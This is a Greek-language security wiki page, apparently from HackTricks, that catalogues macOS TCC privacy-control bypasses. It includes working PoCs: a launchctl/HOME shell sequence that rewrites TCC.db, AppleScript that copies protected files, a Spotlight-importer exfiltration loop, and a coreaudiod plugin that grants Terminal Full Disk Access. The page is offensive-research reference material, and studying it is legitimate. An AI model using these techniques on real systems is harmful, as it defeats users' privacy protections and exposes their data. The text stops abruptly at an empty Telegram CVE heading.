# TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

Για την αποθήκευση των εκχωρήσεων TCC και την απόδοση αποστολέα/στόχου Automation, δείτε την [επισκόπηση του macOS TCC](../index.html#identify-apple-events-sender-and-target-grants).

## Ανά λειτουργικότητα

### Write Bypass

Αυτό δεν είναι bypass, έτσι λειτουργεί απλώς το TCC: **Δεν προστατεύει από την εγγραφή**. Αν το Terminal **δεν έχει πρόσβαση για ανάγνωση στην επιφάνεια εργασίας ενός χρήστη, μπορεί και πάλι να γράψει σε αυτήν**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

Το **extended attribute `com.apple.macl`** προστίθεται στο νέο **file** για να δώσει στην **app δημιουργού** πρόσβαση ανάγνωσης σε αυτό.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Είναι δυνατό να **τοποθετηθεί ένα παράθυρο πάνω από το prompt του TCC**, ώστε ο χρήστης να το **αποδεχτεί** χωρίς να το αντιληφθεί. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Αίτημα TCC με αυθαίρετο όνομα

Ο επιτιθέμενος μπορεί να **δημιουργήσει apps με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να τα κάνει να ζητήσουν πρόσβαση σε κάποια τοποθεσία που προστατεύεται από το TCC. Ο χρήστης θα νομίσει ότι το αίτημα πρόσβασης προέρχεται από τη νόμιμη εφαρμογή.\
Επιπλέον, είναι δυνατό να **αφαιρεθεί η νόμιμη app από το Dock και να τοποθετηθεί εκεί η ψεύτικη**, ώστε όταν ο χρήστης κάνει κλικ στην ψεύτικη app (η οποία μπορεί να χρησιμοποιεί το ίδιο εικονίδιο), αυτή να μπορεί να καλέσει τη νόμιμη app, να ζητήσει δικαιώματα TCC και να εκτελέσει malware, κάνοντας τον χρήστη να πιστέψει ότι η νόμιμη app ζήτησε την πρόσβαση.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Full Disk Access"**. Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της από τη λίστα δεν καταργεί αυτά τα δικαιώματα):<sup>[[2]](#references)</sup>

![Αίτημα TCC με αυθαίρετο όνομα - SSH Bypass: Από προεπιλογή, η πρόσβαση μέσω SSH είχε "Full Disk Access". Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της...](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα malware που **κατάφεραν να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Σημειώστε ότι πλέον, για να μπορέσετε να ενεργοποιήσετε το SSH, απαιτείται **Full Disk Access**

### Διαχείριση extensions - CVE-2022-26767

Το attribute **`com.apple.macl`** προστίθεται σε αρχεία για να δώσει σε μια **συγκεκριμένη εφαρμογή δικαιώματα ανάγνωσής τους.** Αυτό το attribute ορίζεται όταν γίνεται **drag\&drop** ενός αρχείου πάνω σε μια app ή όταν ο χρήστης κάνει **διπλό κλικ** σε ένα αρχείο για να το ανοίξει με την **προεπιλεγμένη εφαρμογή**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει μια κακόβουλη app** για τη διαχείριση όλων των extensions και να καλέσει τις Launch Services για να **ανοίξουν** οποιοδήποτε αρχείο (οπότε θα παραχωρηθεί στην κακόβουλη app πρόσβαση ανάγνωσής του).<sup>[[23]](#references)</sup>

### iCloud

Το entitlement **`com.apple.private.icloud-account-access`** επιτρέπει την επικοινωνία με την υπηρεσία XPC **`com.apple.iCloudHelper`**, η οποία θα **παρέχει tokens iCloud**.

Οι **iMovie** και **Garageband** είχαν αυτό το entitlement, καθώς και άλλα entitlements που επέτρεπαν την πρόσβαση.

Για περισσότερες **πληροφορίες** σχετικά με το exploit για την **απόκτηση tokens iCloud** μέσω αυτού του entitlement, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Διαρροή από Spotlight importer μέσω ονομάτων ειδοποιήσεων Darwin

Ένας Spotlight importer μπορεί να διαβάσει το αρχείο που του περνά το Spotlight στο callback `GetMetadataForFile`, ακόμη κι όταν μια κανονική διεργασία χωρίς Full Disk Access δεν μπορεί να το διαβάσει. Σε αντίθεση με την [εισαγωγή κώδικα σε διεργασία εξουσιοδοτημένη από το TCC](../macos-tcc-credential-and-data-theft.md), αυτό απαιτεί τοπική πρόσβαση που επιτρέπει την εγκατάσταση ενός importer και ένα αντίστοιχο συμβάν ευρετηρίασης του Spotlight. Ο importer βρίσκεται σε sandbox, αλλά οι ειδοποιήσεις Darwin που περιέχουν μόνο όνομα μπορούν να μεταφέρουν bytes σε έναν listener εκτός αυτού του sandbox. Πρόκειται για κανάλι data-leak, όχι για τρόπο απόκτησης root ή αυθαίρετης πρόσβασης σε αρχεία από τον importer.<sup>[[24]](#references)</sup>

Δηλώστε τον τύπο αρχείου-στόχου κάτω από `CFBundleDocumentTypes` → `LSItemContentTypes` στο `Info.plist` του importer και, στη συνέχεια, εγκαταστήστε το bundle στο `~/Library/Spotlight/` ή στο `Contents/Library/Spotlight/` μιας app. Ελέγξτε την καταχώριση με `mdimport -L`. Η [ενότητα για τους Spotlight importer](../../../../macos-auto-start-locations.md#spotlight-plugins) καλύπτει την τοποθέτηση του bundle και την αντιστοίχιση τύπων αρχείων. Ο importer λαμβάνει μόνο αρχεία για τα οποία τον επιλέγει το Spotlight· ένας ήδη υπάρχων importer έχει συνήθως προτεραιότητα. Στο macOS 26 Tahoe, το `mdimport -i` δεν επέβαλλε αξιόπιστα άμεση αναδρομική ευρετηρίαση στις αναφερόμενες δοκιμές, ενώ το `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` ζητούσε την επανεισαγωγή των UTI που δήλωνε αυτός ο importer.<sup>[[24]](#references)</sup>

Για να δοκιμάσετε το κανάλι, ξεκινήστε έναν listener εκτός του sandbox με `notifyutil -w TEST_TEST_TEST` και, στη συνέχεια, δημοσιεύστε μια ειδοποίηση με `CFNotificationCenterGetDarwinNotifyCenter()` και `NULL` για τα object και `userInfo`. Σε αντίθεση με μια distributed notification που περιέχει payload `userInfo`, η ειδοποίηση Darwin έχει μόνο το όνομά της. Για δυαδικά δεδομένα, καταχωρίστε τον εξωτερικό listener για τα δεκαδικά ονόματα `0` έως `255` χρησιμοποιώντας `notify_register_dispatch`· αντιστοιχίστε κάθε registration callback στην αντίστοιχη τιμή byte. Μέσα στο `GetMetadataForFile`, διαβάστε μόνο το `pathToFile` που παρέχεται από το Spotlight και στείλτε κάθε byte ως όνομα δεκαδικής ειδοποίησης:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

Ο listener ανασυνθέτει την ακολουθία byte αντί να διαβάζει ο ίδιος το αρχείο που προστατεύεται από TCC. Το δημοσιευμένο PoC ανέκτησε τα πρώτα 64 byte του `knowledgeC.db` από ένα terminal χωρίς FDA, με ενεργό SIP, στο macOS 26. Πρόκειται για μέθοδο χαμηλού εύρους ζώνης και δεν είναι αξιόπιστη για μαζική αντιγραφή: το Spotlight μπορεί να μην ευρετηριάσει ή να μην επαναευρετηριάσει ένα αρχείο-στόχο, ενώ ταυτόχρονες διεργασίες importer μπορεί να αναμείξουν τις ροές ειδοποιήσεων. Δείτε το [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/) για άλλους μηχανισμούς παράκαμψης των ορίων του sandbox.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Μια εφαρμογή με την άδεια **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλες εφαρμογές**. Αυτό σημαίνει ότι θα μπορούσε να **κάνει κατάχρηση των αδειών που έχουν παραχωρηθεί στις άλλες εφαρμογές**.<sup>[[2]](#references)</sup>

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, δείτε:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν μια εφαρμογή έχει **άδεια Automation για το `iTerm`**, όπως σε αυτό το παράδειγμα όπου το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Μέσω του iTerm

Το Terminal, που δεν έχει FDA, μπορεί να καλέσει το iTerm, που έχει, και να το χρησιμοποιήσει για να εκτελέσει ενέργειες:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Μέσω Finder

Ή αν μια εφαρμογή έχει πρόσβαση μέσω Finder, θα μπορούσε να εκτελέσει ένα script όπως αυτό:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## Ανά συμπεριφορά εφαρμογής

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Ο **tccd daemon** του userland χρησιμοποιούσε τη μεταβλητή **`HOME`** **env** για να αποκτήσει πρόσβαση στη βάση δεδομένων TCC των χρηστών από: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), και επειδή ο daemon TCC εκτελείται μέσω του **`launchd`** στον τομέα του τρέχοντος χρήστη, είναι δυνατό να **ελεγχθούν όλες οι μεταβλητές περιβάλλοντος** που του μεταβιβάζονται.<sup>[[19]](#references)</sup>\
Έτσι, ένας **attacker θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`** ώστε να δείχνει σε έναν **ελεγχόμενο** **κατάλογο**, να **επανεκκινήσει** τον **TCC** daemon και, στη συνέχεια, να **τροποποιήσει απευθείας τη βάση δεδομένων TCC**, ώστε να αποκτήσει **κάθε διαθέσιμο δικαίωμα TCC** χωρίς να εμφανιστεί ποτέ προτροπή στον τελικό χρήστη.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Το Notes είχε πρόσβαση σε τοποθεσίες που προστατεύονται από το TCC, αλλά μια νέα σημείωση **αποθηκευόταν σε μη προστατευμένη τοποθεσία**. Επομένως, ένας attacker μπορούσε να ζητήσει από το Notes να αντιγράψει ένα προστατευμένο αρχείο σε μια σημείωση και έπειτα να αποκτήσει πρόσβαση στα δεδομένα που προέκυπταν από τη μη προστατευμένη τοποθεσία:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Το binary `/usr/libexec/lsd`, μαζί με τη library `libsecurity_translocate`, διέθετε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργεί mount **nullfs**, καθώς και το entitlement `com.apple.private.tcc.allow` με **`kTCCServiceSystemPolicyAllFiles`**, που του επέτρεπε να αποκτά πρόσβαση σε κάθε αρχείο.

Ήταν δυνατό να προστεθεί το χαρακτηριστικό quarantine στο "Library", να κληθεί η υπηρεσία XPC **`com.apple.security.translocation`** και, στη συνέχεια, να γίνει αντιστοίχιση του Library στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου μπορούσε να γίνει **πρόσβαση** σε όλα τα έγγραφα μέσα στο Library.

### CVE-2024-44131 - FileProvider symlink race

Οι εφαρμογές που αναθέτουν τις λειτουργίες αρχείων σε έναν **privileged helper** (εδώ το **`fileproviderd`** / `Files.app`) αντιγράφουν ή μετακινούν στοιχεία **εκ μέρους του χρήστη**, επομένως η αντιγραφή εκτελείται με τα προνόμια του helper και όχι του caller.

Το Jamf Threat Labs έδειξε ότι η επικύρωση symlink που γίνεται πριν από τη λειτουργία μπορεί να υποβληθεί σε **race**: αντί να τοποθετήσει το symlink στο **τελευταίο** στοιχείο της διαδρομής (το οποίο ελέγχεται), ο attacker αντικαθιστά έναν **ενδιάμεσο** κατάλογο της διαδρομής **αφού έχει ήδη ξεκινήσει η αντιγραφή**. Τότε ο privileged helper ακολουθεί τον σύνδεσμο που ελέγχει ο attacker και διαβάζει/γράφει σε τοποθεσίες που προστατεύονται από το TCC **χωρίς να εμφανιστεί ποτέ prompt**.<sup>[[5]](#references)</sup>

Οι κατάλογοι που **δεν** προστατεύονται από ένα τυχαίο UUID στη διαδρομή τους (για παράδειγμα, `~/Library/Mobile Documents/com~apple~CloudDocs`) είναι οι ευκολότεροι στόχοι, επειδή ο attacker μπορεί να προβλέψει την πλήρη διαδρομή για το race.

> [!TIP]
> Αυτό είναι το γενικό μοτίβο που πρέπει να αναζητάτε: **κάθε privileged process που επιλύει μια διαδρομή περισσότερες από μία φορές** (έλεγχος και μετά χρήση ή `rename()`/`copyfile()` που επιλύουν ξεχωριστά την πηγή και τον προορισμό) μπορεί να υποβληθεί σε race με την αντικατάσταση ενός καταλόγου στη μέση της διαδρομής. Μόνο τα `O_NOFOLLOW_ANY`, `openat()` σε ένα ήδη ανοιγμένο directory FD ή `realpath()` μαζί με επανεπικύρωση κλείνουν πραγματικά αυτό το χρονικό παράθυρο.

Περισσότερες πληροφορίες στο [**άρθρο του Jamf Threat Labs**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

Το `libsqlite3` μπορεί να γίνει build με το `SQLITE_ENABLE_SQLLOG`, το οποίο προσθέτει ένα logging hook που ελέγχεται από environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – για **κάθε database που ανοίγει**, ένα **αντίγραφο του αρχείου της database** και ένα log των SQL statements εγγράφονται στο `path` (ο κατάλογος πρέπει να υπάρχει ήδη).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – δημιουργεί **νέο αντίγραφο κάθε φορά** που ανοίγεται/προσαρτάται μια DB, αντί να επαναχρησιμοποιεί κάποιο υπάρχον.
- **`SQLITE_SQLLOG_CONDITIONAL`** – καταγράφει μια σύνδεση μόνο αν υπάρχει ένα αρχείο `<database>-sqllog` δίπλα στην κύρια DB.

Αν μπορείτε να εισαγάγετε αυτή τη μεταβλητή σε ένα process που διαθέτει **FDA** και ανοίγει SQLite databases, αυτό θα **αντιγράψει πρόθυμα αυτές τις προστατευμένες databases** σε έναν κατάλογο που ελέγχετε. Επειδή το όνομα του αρχείου προορισμού προκύπτει από δεδομένα που ελέγχει ο attacker, ένα **symlink στον προορισμό** μετατρέπει τον ίδιο μηχανισμό σε **αυθαίρετη εγγραφή αρχείου** με τα προνόμια του process-στόχου.

### **SQLITE_AUTO_TRACE**

Αν έχει οριστεί η environment variable **`SQLITE_AUTO_TRACE`**, η library **`libsqlite3.dylib`** αρχίζει να **καταγράφει** όλα τα SQL queries. Πολλές εφαρμογές χρησιμοποιούσαν αυτή τη library, επομένως ήταν δυνατή η καταγραφή όλων των SQL queries τους.<sup>[[22]](#references)</sup>

Αρκετές εφαρμογές της Apple χρησιμοποιούσαν αυτή τη library για να αποκτούν πρόσβαση σε πληροφορίες που προστατεύονται από το TCC.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### Αναζήτηση για εγγραφές αρχείων που ελέγχονται μέσω env vars

Οι δύο προηγούμενες περιπτώσεις είναι παραδείγματα της ίδιας γενικής τεχνικής, και αξίζει να αναζητήσουμε κι άλλες: **τα frameworks που φορτώνονται σε εφαρμογές με προνόμια TCC συχνά εκθέτουν environment variables για debugging/logging, οι οποίες κάνουν τη διεργασία να δημιουργεί ένα αρχείο σε διαδρομή που ελέγχει ο καλών**.

Ροή εργασίας για να τις εντοπίσετε:

1. Επιλέξτε έναν στόχο με FDA ή άλλη σημαντική άδεια TCC (`Music`, `TV`, `Terminal`, agents MDM...) και καταγράψτε τα frameworks με τα οποία συνδέεται (`otool -L`, `vmmap`).
2. Αναζητήστε στα frameworks συμβολοσειρές `getenv`: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Ορίστε υποψήφιες μεταβλητές μέσω `launchctl setenv NAME /path/you/control`, εκκινήστε την εφαρμογή και παρακολουθήστε τις ενέργειές της στο filesystem με `fs_usage -w -f filesys <pid>` ή `sudo fs_usage | grep <path>`.
4. Αν η διεργασία **δημιουργεί ή μετονομάζει** ένα αρχείο στον κατάλογό σας, έχετε ένα write primitive: ορίστε ως προορισμό ένα symlink (ή κάντε race σε έναν ενδιάμεσο κατάλογο, όπως στο CVE-2024-44131 παραπάνω), ώστε να ανακατευθύνετε την εγγραφή στο `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Δύο πράγματα περιορίζουν αυτή την τεχνική. Πρώτον, οι μεταβλητές **`DYLD_*` αγνοούνται από binaries με hardened runtime**, εκτός αν η εφαρμογή διαθέτει το entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) («μια Boolean τιμή που υποδεικνύει αν η εφαρμογή μπορεί να επηρεαστεί από environment variables του dynamic linker, τις οποίες μπορείτε να χρησιμοποιήσετε για να εισαγάγετε κώδικα στη διεργασία της εφαρμογής») — δείτε επίσης το [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Δεύτερον, η Apple αφαιρεί τις μεμονωμένες debug variables των frameworks μόλις αναφερθούν, οπότε μια μεταβλητή που λειτουργούσε σε μια έκδοση macOS συχνά έχει αφαιρεθεί στην επόμενη. Αν μια εφαρμογή αρνείται σιωπηλά να εκκινηθεί αφού ορίσετε μια μεταβλητή, θεωρήστε ότι έχει ήδη φιλτραριστεί.<sup>[[7]](#references)[[8]](#references)</sup>

Δείτε το [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) για το αντίστοιχο τέχνασμα με μεταβλητές linker.

### Apple Remote Desktop

Ως root, μπορείτε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα έχει πλήρη πρόσβαση στον δίσκο**, την οποία θα μπορούσε έπειτα να εκμεταλλευτεί ένας χρήστης για να τον κάνει να αντιγράψει μια νέα **βάση δεδομένων TCC χρήστη**.

## Μέσω **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια βάση δεδομένων στον φάκελο HOME του χρήστη για να ελέγχει την πρόσβαση σε πόρους που αφορούν τον συγκεκριμένο χρήστη, στη διαδρομή **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να επανεκκινήσει το TCC με μια μεταβλητή περιβάλλοντος $HOME που δείχνει σε **διαφορετικό φάκελο**, μπορεί να δημιουργήσει μια νέα βάση δεδομένων TCC στο **/Library/Application Support/com.apple.TCC/TCC.db** και να ξεγελάσει το TCC ώστε να παραχωρήσει οποιαδήποτε άδεια TCC σε οποιαδήποτε εφαρμογή.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που είναι αποθηκευμένη στο προφίλ του χρήστη, στο χαρακτηριστικό **`NFSHomeDirectory`**, ως **τιμή του `$HOME`**. Επομένως, αν παραβιάσετε μια εφαρμογή που έχει άδεια να τροποποιεί αυτή την τιμή (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **οπλοποιήσετε** αυτή την επιλογή για να παρακάμψετε το TCC.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **πρώτο POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει τον φάκελο **HOME** του χρήστη.

1. Αποκτήστε ένα blob _csreq_ για την εφαρμογή-στόχο.
2. Τοποθετήστε ένα πλαστό αρχείο _TCC.db_ με την απαιτούμενη πρόσβαση και το blob _csreq_.
3. Εξαγάγετε την εγγραφή Directory Services του χρήστη με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε την εγγραφή Directory Services για να αλλάξετε τον αρχικό κατάλογο του χρήστη.
5. Εισαγάγετε την τροποποιημένη εγγραφή Directory Services με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του χρήστη και επανεκκινήστε τη διεργασία.

Το δεύτερο POC χρησιμοποίησε το **`/usr/libexec/configd`**, το οποίο είχε το `com.apple.private.tcc.allow` με τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατό να εκτελεστεί το **`configd`** με την επιλογή **`-t`**, μέσω της οποίας ένας επιτιθέμενος μπορούσε να ορίσει ένα **προσαρμοσμένο Bundle προς φόρτωση**. Έτσι, το exploit **αντικαθιστά** τη μέθοδο αλλαγής του αρχικού καταλόγου του χρήστη μέσω **`dsexport`** και **`dsimport`** με **code injection στο `configd`**.

Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Μέσω process injection

Υπάρχουν διαφορετικές τεχνικές για την εισαγωγή κώδικα σε μια διεργασία και την εκμετάλλευση των προνομίων TCC της:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, η συνηθέστερη μέθοδος process injection που εντοπίζεται για την παράκαμψη του TCC γίνεται μέσω **plugins (load library)**.\
Τα plugins είναι πρόσθετος κώδικας, συνήθως με τη μορφή libraries ή plist, που **φορτώνεται από την κύρια εφαρμογή** και εκτελείται στο περιβάλλον της. Επομένως, αν η κύρια εφαρμογή είχε πρόσβαση σε αρχεία που περιορίζει το TCC (μέσω παραχωρημένων αδειών ή entitlements), **θα έχει πρόσβαση και ο προσαρμοσμένος κώδικας**.

### CVE-2020-27937 - Directory Utility

Η εφαρμογή `/System/Library/CoreServices/Applications/Directory Utility.app` είχε το entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωνε plugins με επέκταση **`.daplug`** και **δεν είχε hardened runtime**.

Για την οπλοποίηση αυτού του CVE, αλλάζει το **`NFSHomeDirectory`** (με εκμετάλλευση του παραπάνω entitlement), ώστε να **αναλάβετε τον έλεγχο της βάσης δεδομένων TCC του χρήστη** και να παρακάμψετε το TCC.

Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Το binary **`/usr/sbin/coreaudiod`** είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο **επέτρεπε code injection** και το δεύτερο του έδινε πρόσβαση στη **διαχείριση του TCC**.

Αυτό το binary επέτρεπε τη φόρτωση **third-party plug-ins** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατό να **φορτωθεί ένα plugin και να γίνει εκμετάλλευση των αδειών TCC** με αυτό το PoC:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

Για περισσότερες πληροφορίες, δείτε την [**αρχική αναφορά**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Οι εφαρμογές συστήματος που ανοίγουν ροή κάμερας μέσω του Core Media I/O (εφαρμογές με **`kTCCServiceCamera`**) φορτώνουν **τα συγκεκριμένα plug-ins μέσα στη διεργασία τους**. Βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (δεν περιορίζονται από το SIP).

Αρκεί να αποθηκευτεί εκεί μια βιβλιοθήκη με τον συνηθισμένο **constructor** για να γίνει **inject code**.

Αρκετές εφαρμογές της Apple ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

Για περισσότερες πληροφορίες σχετικά με το πώς να το εκμεταλλευτείτε εύκολα, [**δείτε την αρχική αναφορά**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Το binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την εισαγωγή κώδικα στη διεργασία και τη χρήση των προνομίων TCC.

### CVE-2023-26818 - Telegram

